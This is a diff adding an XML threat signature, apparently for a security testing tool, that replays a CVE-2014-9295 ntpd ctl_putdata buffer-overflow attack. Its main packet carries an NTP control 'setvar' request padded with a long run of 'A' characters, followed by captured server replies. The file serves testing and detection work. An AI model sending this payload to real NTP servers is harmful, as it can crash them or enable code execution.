@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Network Time Protocol Daemon ctl_putdata Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in the Network Time Protocol daemon (NTPD). The vulnerability is due to insufficient checks on an input size prior to a copy operation in the ctl_putdata() function. A remote privileged attacker could exploit this vulnerability by sending a crafted NTP request to the vulnerable service. Successful exploitation could result in arbitrary code execution with the privilege level of the ntpd process. Tester should set variable $destPort to 123 before test."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="NTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="ntp.org"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="NTP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_4.2.8"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20141219-10"/>
+    <CVEID display="true" value="CVE-2014-9295"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="116067"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="243a5cfb7228093536c6c90d583346fc"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="SINGLE"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635578785670238633"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1422268214" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="F"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="C">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="D">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:4F:F5" destMac="00:50:56:B4:0C:E8" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0358" Identification="2552" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="A8EA" srcIP="172.16.8.108" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="44312" destPort="$destPort" checksum="DB4C" length="0344" Payload="1608000100000000000003197365747661722074736C203D2022414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141222064656661756C74200A0000000000006FFC735185D199BED6EBCDE185CFCA922F"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="00:50:56:B4:4F:F5" destMac="00:50:56:B4:0C:E8" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0028" Identification="2553" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="AC19" srcIP="172.16.8.108" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="44312" destPort="$destPort" checksum="D2D6" length="0014" Payload="160200010000000000000000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1,3">
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:50:56:B4:0C:E8" destMac="00:50:56:B4:4F:F5" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="C0" TotalLength="0050" Identification="EAD7" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="E5AC" srcIP="$destIP" destIP="172.16.8.108" options="" CE="false" DF="true" MF="false">
+          <UDP srcPort="$destPort" destPort="44312" checksum="095C" length="003C" Payload="D68800010000000000000012436F6E666967205375636365656465640D0A00000000006F9455FDFD90B4036586CC7812B8633E47"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="00:50:56:B4:0C:E8" destMac="00:50:56:B4:4F:F5" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="C0" TotalLength="019C" Identification="3112" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="9E26" srcIP="$destIP" destIP="172.16.8.108" options="" CE="false" DF="true" MF="false">
+          <UDP srcPort="$destPort" destPort="44312" checksum="1AAE" length="0188" Payload="D6A20001C01100000000017276657273696F6E3D226E74706420342E322E36703540312E323334392D6F20576564204A616E2031342031393A33343A35332055544320323031352028333229222C0D0A70726F636573736F723D227838365F3634222C2073797374656D3D224C696E75782F332E322E302D37302D67656E65726963222C206C6561703D332C207374726174756D3D31362C0D0A707265636973696F6E3D2D32312C20726F6F7464656C61793D302E3030302C20726F6F74646973703D302E3234302C2072656669643D494E49542C0D0A72656674696D653D307830303030303030302E30303030303030302C20636C6F636B3D307864383633623561302E34656564653333312C20706565723D302C2074633D332C0D0A6D696E74633D332C206F66667365743D302E3030302C206672657175656E63793D302E3030302C207379735F6A69747465723D302E3030302C0D0A636C6B5F6A69747465723D302E3030302C20636C6B5F77616E6465723D302E3030302C0D0A0000"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
